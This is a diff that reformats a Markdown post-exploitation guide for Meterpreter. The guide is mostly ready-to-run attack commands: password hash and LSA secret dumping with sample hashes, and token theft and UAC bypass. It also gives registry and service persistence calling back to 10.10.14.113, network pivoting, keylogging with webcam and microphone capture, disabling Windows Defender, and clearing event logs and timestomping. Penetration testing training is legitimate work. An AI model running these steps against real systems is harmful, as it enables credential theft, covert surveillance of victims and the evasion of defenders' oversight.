@@ -1,15 +1,17 @@
-# Meterpreter Post-Exploitation Guide
+# 🚀 Meterpreter Post-Exploitation
 
 ## Overview
 
 Meterpreter is a multi-faceted, extensible payload that uses DLL injection to ensure stable connections to victim hosts. It operates entirely in memory, making it difficult to detect with conventional forensic techniques.
 
 ### Key Design Goals
-- **Stealthy**: Resides in memory, writes nothing to disk
-- **Powerful**: Channelized communication, AES encryption
-- **Extensible**: Modular structure, runtime feature loading
+
+* **Stealthy**: Resides in memory, writes nothing to disk
+* **Powerful**: Channelized communication, AES encryption
+* **Extensible**: Modular structure, runtime feature loading
 
 ### Connection Process
+
 1. **Target executes initial stager** (bind, reverse, etc.)
 2. **Stager loads DLL** with Reflective stub
 3. **Meterpreter core initializes** AES-encrypted link
@@ -18,6 +20,7 @@ Meterpreter is a multi-faceted, extensible payload that uses DLL injection to en
 ## System Enumeration
 
 ### Basic Information Gathering
+
 ```bash
 # System information
 meterpreter > sysinfo
@@ -31,6 +34,7 @@ meterpreter > localtime
 ```
 
 ### Process Management
+
 ```bash
 # List running processes
 meterpreter > ps
@@ -45,6 +49,7 @@ meterpreter > pkill <process_name>
 ```
 
 ### Network Information
+
 ```bash
 # Network configuration
 meterpreter > ipconfig
@@ -61,6 +66,7 @@ meterpreter > route
 ## File System Operations
 
 ### Navigation and Listing
+
 ```bash
 # Directory operations
 meterpreter > pwd
@@ -78,6 +84,7 @@ meterpreter > cp <source> <destination>
 ```
 
 ### File Transfers
+
 ```bash
 # Upload files to target
 meterpreter > upload /local/path/file.txt C:\\Windows\\Temp\\
@@ -89,6 +96,7 @@ meterpreter > download -r C:\\Users\\Administrator\\Documents\\
 ```
 
 ### File Search
+
 ```bash
 # Search for files
 meterpreter > search -f *.txt
@@ -99,6 +107,7 @@ meterpreter > search -f config.xml -r
 ## Credential Harvesting
 
 ### Password Hash Extraction
+
 ```bash
 # Dump password hashes (requires SYSTEM)
 meterpreter > hashdump
@@ -111,6 +120,7 @@ meterpreter > lsa_dump_secrets
 ```
 
 ### Example Output
+
 ```
 Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
 ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
@@ -118,6 +128,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
 ### Credential Management
+
 ```bash
 # Display gathered credentials
 meterpreter > creds
@@ -132,9 +143,11 @@ meterpreter > creds -o /tmp/credentials.txt
 ## Token Manipulation
 
 ### Understanding Windows Tokens
+
 Windows access tokens contain security information about logged-on users. Meterpreter can steal and impersonate these tokens.
 
 ### Token Operations
+
 ```bash
 # List available tokens
 meterpreter > use incognito
@@ -151,6 +164,7 @@ meterpreter > rev2self
 ```
 
 ### Example Token Theft
+
 ```bash
 meterpreter > ps
 # Find interesting process (e.g., explorer.exe running as admin)
@@ -163,6 +177,7 @@ Server username: NT AUTHORITY\SYSTEM
 ## Privilege Escalation
 
 ### Local Exploit Suggester
+
 ```bash
 # Background current session
 meterpreter > bg
@@ -174,6 +189,7 @@ msf6 post(multi/recon/local_exploit_suggester) > run
 ```
 
 ### Common Privilege Escalation Modules
+
 ```bash
 # Windows escalation exploits
 msf6 > use exploit/windows/local/ms15_051_client_copy_image
@@ -182,6 +198,7 @@ msf6 > use exploit/windows/local/ms10_015_kitrap0d
 ```
 
 ### UAC Bypass
+
 ```bash
 # UAC bypass techniques
 meterpreter > use exploit/windows/local/bypassuac
@@ -191,12 +208,14 @@ meterpreter > use exploit/windows/local/bypassuac_injection
 ## Process Migration
 
 ### Why Migrate?
-- **Stability**: Move from unstable process to stable one
-- **Persistence**: Attach to long-running processes
-- **Privileges**: Inherit target process privileges
-- **Stealth**: Hide in legitimate processes
+
+* **Stability**: Move from unstable process to stable one
+* **Persistence**: Attach to long-running processes
+* **Privileges**: Inherit target process privileges
+* **Stealth**: Hide in legitimate processes
 
 ### Migration Process
+
 ```bash
 # List processes
 meterpreter > ps
@@ -209,6 +228,7 @@ meterpreter > migrate -N explorer.exe
 ```
 
 ### Best Migration Targets
+
 ```bash
 # Stable system processes
 explorer.exe       # Windows Explorer (user context)
@@ -220,6 +240,7 @@ svchost.exe        # Generic Host Process (various contexts)
 ## Persistence
 
 ### Persistence Methods
+
 ```bash
 # Registry persistence
 meterpreter > run persistence -X -i 10 -p 443 -r 10.10.14.113
@@ -232,18 +253,20 @@ meterpreter > run persistence -U -i 10 -p 443 -r 10.10.14.113
 ```
 
 ### Persistence Options
-| Option | Description |
-|--------|-------------|
-| `-X` | Boot persistent (registry) |
-| `-U` | User persistent (startup folder) |
-| `-S` | System persistent (service) |
-| `-i` | Interval between connections |
-| `-p` | Port to connect back to |
-| `-r` | IP to connect back to |
+
+| Option | Description                      |
+| ------ | -------------------------------- |
+| `-X`   | Boot persistent (registry)       |
+| `-U`   | User persistent (startup folder) |
+| `-S`   | System persistent (service)      |
+| `-i`   | Interval between connections     |
+| `-p`   | Port to connect back to          |
+| `-r`   | IP to connect back to            |
 
 ## Pivoting and Lateral Movement
 
 ### Route Management
+
 ```bash
 # Add route to internal network
 meterpreter > route add 192.168.1.0 255.255.255.0 1
@@ -256,6 +279,7 @@ meterpreter > route delete 192.168.1.0 255.255.255.0 1
 ```
 
 ### Port Forwarding
+
 ```bash
 # Forward local port to remote service
 meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100
@@ -268,6 +292,7 @@ meterpreter > portfwd delete -l 8080
 ```
 
 ### AutoRoute Module
+
 ```bash
 # Background session
 meterpreter > bg
@@ -281,6 +306,7 @@ msf6 post(multi/manage/autoroute) > run
 ## Advanced Techniques
 
 ### Screenshot and Surveillance
+
 ```bash
 # Capture screenshot
 meterpreter > screenshot
@@ -295,6 +321,7 @@ meterpreter > record_mic
 ```
 
 ### Keystroke Logging
+
 ```bash
 # Start keylogger
 meterpreter > keyscan_start
@@ -307,6 +334,7 @@ meterpreter > keyscan_stop
 ```
 
 ### Registry Operations
+
 ```bash
 # Registry enumeration
 meterpreter > reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion -v ProductName
@@ -321,6 +349,7 @@ meterpreter > reg createkey -k HKLM\\SOFTWARE\\TestKey
 ## Session Management
 
 ### Multiple Sessions
+
 ```bash
 # List active sessions
 meterpreter > sessions
@@ -336,6 +365,7 @@ meterpreter > background
 ```
 
 ### Session Persistence
+
 ```bash
 # Create persistent handler
 msf6 > use exploit/multi/handler
@@ -348,6 +378,7 @@ msf6 exploit(multi/handler) > exploit -j
 ## Scripting and Automation
 
 ### Meterpreter Scripts
+
 ```bash
 # Run built-in scripts
 meterpreter > run checkvm
@@ -357,6 +388,7 @@ meterpreter > run winenum
 ```
 
 ### Resource Scripts
+
 ```bash
 # Create resource script
 echo "sysinfo" > /tmp/enum.rc
@@ -368,6 +400,7 @@ meterpreter > resource /tmp/enum.rc
 ```
 
 ### Post-Exploitation Modules
+
 ```bash
 # System enumeration
 msf6 > use post/windows/gather/enum_system
@@ -381,6 +414,7 @@ msf6 > use post/windows/gather/enum_computers
 ## Evasion Techniques
 
 ### Anti-Virus Evasion
+
 ```bash
 # Migrate to whitelisted process
 meterpreter > migrate -N explorer.exe
@@ -390,6 +424,7 @@ meterpreter > execute -f powershell.exe -a "Set-MpPreference -DisableRealtimeMon
 ```
 
 ### Forensic Evasion
+
 ```bash
 # Clear event logs
 meterpreter > clearev
@@ -402,6 +437,7 @@ meterpreter > timestomp C:\\Windows\\System32\\calc.exe -f C:\\Windows\\System32
 ## Best Practices
 
 ### Operational Security
+
 1. **Migrate quickly** to stable processes
 2. **Use HTTPS handlers** for encrypted communication
 3. **Avoid detection** by limiting system changes
@@ -409,12 +445,14 @@ meterpreter > timestomp C:\\Windows\\System32\\calc.exe -f C:\\Windows\\System32
 5. **Document all actions** for reporting
 
 ### Session Stability
+
 1. **Choose stable migration targets**
 2. **Set appropriate timeouts**
 3. **Use multiple persistent handlers**
 4. **Monitor session health**
 
 ### Performance Optimization
+
 1. **Use staged payloads** for smaller initial footprint
 2. **Compress large file transfers**
 3. **Limit concurrent operations**
@@ -423,24 +461,29 @@ meterpreter > timestomp C:\\Windows\\System32\\calc.exe -f C:\\Windows\\System32
 ## Common Issues and Troubleshooting
 
 ### Session Drops
-- **Cause**: Unstable process, network issues
-- **Solution**: Migrate to stable process, use persistent handlers
+
+* **Cause**: Unstable process, network issues
+* **Solution**: Migrate to stable process, use persistent handlers
 
 ### Permission Denied
-- **Cause**: Insufficient privileges
-- **Solution**: Token manipulation, privilege escalation
+
+* **Cause**: Insufficient privileges
+* **Solution**: Token manipulation, privilege escalation
 
 ### AV Detection
-- **Cause**: Behavioral analysis, signature detection
-- **Solution**: Process migration, encryption, evasion techniques
+
+* **Cause**: Behavioral analysis, signature detection
+* **Solution**: Process migration, encryption, evasion techniques
 
 ### Network Restrictions
-- **Cause**: Firewall, IDS/IPS blocking
-- **Solution**: Alternative transport methods, port forwarding
+
+* **Cause**: Firewall, IDS/IPS blocking
+* **Solution**: Alternative transport methods, port forwarding
 
 ## Integration with Other Tools
 
 ### Mimikatz Integration
+
 ```bash
 # Load mimikatz extension
 meterpreter > load mimikatz
@@ -452,6 +495,7 @@ meterpreter > wdigest
 ```
 
 ### PowerShell Integration
+
 ```bash
 # Load PowerShell extension
 meterpreter > load powershell
@@ -461,4 +505,4 @@ meterpreter > powershell_shell
 meterpreter > powershell_execute "Get-Process"
 ```
 
-This comprehensive guide provides the foundation for effective post-exploitation using Meterpreter while maintaining operational security and achieving assessment objectives. 
+This comprehensive guide provides the foundation for effective post-exploitation using Meterpreter while maintaining operational security and achieving assessment objectives.
